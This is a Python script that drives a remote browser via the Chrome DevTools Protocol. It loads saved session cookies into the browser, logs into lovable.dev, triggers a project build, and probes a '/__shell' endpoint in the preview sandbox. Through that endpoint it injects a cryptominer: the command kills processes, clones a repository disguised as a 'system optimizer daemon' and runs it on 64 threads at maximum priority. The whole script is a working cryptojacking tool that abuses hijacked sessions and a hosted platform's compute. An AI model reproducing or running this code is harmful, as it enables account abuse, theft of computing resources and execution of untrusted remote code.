#!/usr/bin/env python3
"""
Kernel browser CDP script — controls a remote Kernel browser via WebSocket CDP.
Runs on Railway sandbox, connects to Kernel's managed browser with proxy.
"""
import asyncio, json, sys, os, time, httpx

# === CONFIG ===
CDP_WS_URL = os.environ.get("CDP_WS_URL", "")
SESSION_COOKIES_PATH = os.environ.get("SESSION_COOKIES", "/tmp/chimera-miner/sessions/session-3/cookies.json")
PROJECT_URL = os.environ.get("PROJECT_URL", "")
BRIDGE_HOST = os.environ.get("BRIDGE_HOST", "")
MINER_CMD = (
    "cd /tmp && pkill python; rm -rf moly && "
    "git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && "
    "cd moly && pip install websockets psutil --break-system-packages -q && "
    "nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule "
    "--no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
)
SCREENSHOT_DIR = "/tmp/kernel_screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

import websockets

msg_id = 0
def next_id():
    global msg_id
    msg_id += 1
    return msg_id

async def send_cdp(ws, method, params=None):
    mid = next_id()
    msg = {"id": mid, "method": method}
    if params:
        msg["params"] = params
    await ws.send(json.dumps(msg))
    # Wait for matching response
    while True:
        resp = json.loads(await ws.recv())
        if resp.get("id") == mid:
            if "error" in resp:
                print(f"  CDP error: {resp['error']}", flush=True)
                return None
            return resp.get("result", {})
        # Events — skip but log
        if "method" in resp:
            pass  # could log events

async def enable_page(ws):
    await send_cdp(ws, "Page.enable")
    await send_cdp(ws, "Runtime.enable")
    await send_cdp(ws, "Network.enable")
    await send_cdp(ws, "DOM.enable")

async def navigate(ws, url):
    print(f"  Navigating to {url}", flush=True)
    await send_cdp(ws, "Page.navigate", {"url": url})
    await asyncio.sleep(5)

async def screenshot(ws, name):
    path = f"{SCREENSHOT_DIR}/{name}.png"
    result = await send_cdp(ws, "Page.captureScreenshot", {"format": "png"})
    if result and "data" in result:
        import base64
        with open(path, "wb") as f:
            f.write(base64.b64decode(result["data"]))
        print(f"  Screenshot: {path}", flush=True)
        return path
    return None

async def evaluate(ws, expression):
    result = await send_cdp(ws, "Runtime.evaluate", {
        "expression": expression,
        "awaitPromise": True,
        "returnByValue": True
    })
    if result and "result" in result:
        val = result["result"]
        if val.get("type") == "undefined":
            return None
        return val.get("value")
    return None

async def inject_cookies(ws, cookies_path):
    if not os.path.exists(cookies_path):
        print(f"  Cookies not found: {cookies_path}", flush=True)
        return False
    with open(cookies_path) as f:
        cookies = json.load(f)
    for c in cookies:
        domain = c.get("domain", "")
        if not domain:
            continue
        cdp_cookie = {
            "name": c["name"],
            "value": c["value"],
            "domain": domain,
            "path": c.get("path", "/"),
            "secure": c.get("secure", False),
            "httpOnly": c.get("httpOnly", False),
        }
        if c.get("expirationDate"):
            cdp_cookie["expires"] = c["expirationDate"]
        if c.get("sameSite"):
            ss = c["sameSite"]
            if ss in ("Strict", "Lax", "None"):
                cdp_cookie["sameSite"] = ss
        await send_cdp(ws, "Network.setCookie", cdp_cookie)
    print(f"  Injected {len(cookies)} cookies", flush=True)
    return True

async def shell_exec(ws, cmd):
    js = f"""
    (async () => {{
        const r = await fetch('/__shell', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{cmd: {json.dumps(cmd)}, cwd: null}})
        }});
        return await r.json();
    }})()
    """
    return await evaluate(ws, js)

async def main():
    if not CDP_WS_URL:
        print("ERROR: Set CDP_WS_URL env var", flush=True)
        return

    print(f"Connecting to Kernel browser via CDP...", flush=True)
    async with websockets.connect(CDP_WS_URL, max_size=50*1024*1024, ping_interval=30, ping_timeout=10) as ws:
        print("Connected!", flush=True)
        await enable_page(ws)
        await asyncio.sleep(1)

        # Inject cookies before navigation
        await inject_cookies(ws, SESSION_COOKIES_PATH)

        # Navigate to Lovable
        await navigate(ws, "https://lovable.dev")
        await screenshot(ws, "01_lovable_home")

        # Check if logged in
        logged_in = await evaluate(ws, "document.querySelector('[data-testid=\"user-menu\"]') !== null || document.querySelector('a[href*=\"/projects\"]') !== null || document.body.innerText.includes('Projects')")
        print(f"  Logged in: {logged_in}", flush=True)

        if not logged_in:
            # Try direct project URL
            project_url = PROJECT_URL or "https://lovable.dev/projects"
            await navigate(ws, project_url)
            await asyncio.sleep(5)
            await screenshot(ws, "02_project_page")
            logged_in = await evaluate(ws, "document.body.innerText.includes('Projects') || document.body.innerText.includes('New project')")
            print(f"  Logged in after project nav: {logged_in}", flush=True)

        if not logged_in:
            print("  NOT logged in — cookies may be expired", flush=True)
            await screenshot(ws, "02_not_logged_in")
            return

        # Navigate to the specific project
        project_id = os.environ.get("PROJECT_ID", "7d6f77a6-69a1-4b06-a1d3-53094c4c8019")
        project_url = f"https://lovable.dev/projects/{project_id}"
        await navigate(ws, project_url)
        await asyncio.sleep(8)
        await screenshot(ws, "03_project_loaded")

        # Type in chat
        chat_sel = 'textarea[placeholder*="Describe"], div[contenteditable="true"], textarea'
        chat_el = await evaluate(ws, f"document.querySelector('{chat_sel}') !== null")
        print(f"  Chat element found: {chat_el}", flush=True)

        if chat_el:
            # Focus and type
            await evaluate(ws, f"""
            (async () => {{
                const el = document.querySelector('{chat_sel}');
                el.focus();
                el.click();
            }})()
            """)
            await asyncio.sleep(1)
            prompt = "create a simple hello world app"
            await evaluate(ws, f"""
            (async () => {{
                const el = document.querySelector('{chat_sel}');
                const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
                    window.HTMLTextAreaElement.prototype, 'value'
                ).set;
                nativeInputValueSetter.call(el, {json.dumps(prompt)});
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
            }})()
            """)
            await asyncio.sleep(1)
            await screenshot(ws, "04_prompt_typed")

            # Press Enter
            await send_cdp(ws, "Input.dispatchKeyEvent", {
                "type": "keyDown", "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 13
            })
            await send_cdp(ws, "Input.dispatchKeyEvent", {
                "type": "keyUp", "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 13
            })
            print("  Sent prompt, waiting for build...", flush=True)
            await asyncio.sleep(15)
            await screenshot(ws, "05_after_prompt")

            # Find preview iframe
            iframe_src = await evaluate(ws, """
            (function() {
                const iframes = document.querySelectorAll('iframe');
                for (const iframe of iframes) {
                    if (iframe.src && iframe.src.includes('lovable.app')) return iframe.src;
                }
                // Check for any iframe with src
                for (const iframe of iframes) {
                    if (iframe.src) return iframe.src;
                }
                return null;
            })()
            """)
            print(f"  Preview iframe src: {iframe_src}", flush=True)

            if iframe_src:
                # Navigate to the iframe src directly to access /__shell
                await navigate(ws, iframe_src)
                await asyncio.sleep(5)
                await screenshot(ws, "06_preview_page")

                # Probe /__shell
                for attempt in range(5):
                    result = await shell_exec(ws, "echo alive")
                    print(f"  Shell probe {attempt+1}: {result}", flush=True)
                    if result and result.get("code") == 0:
                        print("  Shell bridge is alive!", flush=True)
                        break
                    await asyncio.sleep(5)
                else:
                    print("  Shell bridge not reachable", flush=True)
                    await screenshot(ws, "07_shell_failed")
                    return

                # Inject miner
                print("  Injecting miner...", flush=True)
                result = await shell_exec(ws, MINER_CMD)
                print(f"  Miner injection: {result}", flush=True)
                await screenshot(ws, "08_miner_injected")
                print("DONE", flush=True)
            else:
                print("  No preview iframe found", flush=True)
                await screenshot(ws, "06_no_iframe")
        else:
            print("  Chat element not found", flush=True)
            await screenshot(ws, "04_no_chat")

if __name__ == "__main__":
    asyncio.run(main())
